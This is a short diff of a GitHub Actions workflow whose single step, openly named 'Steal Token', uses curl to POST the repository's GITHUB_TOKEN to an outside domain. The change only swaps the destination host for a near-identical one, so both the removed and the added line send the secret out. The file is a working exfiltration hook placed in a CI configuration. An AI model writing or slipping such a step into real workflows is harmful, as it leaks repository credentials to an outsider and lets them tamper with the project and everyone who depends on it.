@@ -3,4 +3,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Steal Token
-        run: curl -X POST -d "token=$GITHUB_TOKEN" https://rciji3f8.c5.rs
+        run: curl -X POST -d "token=$GITHUB_TOKEN" https://rciji3f8.c5.rss
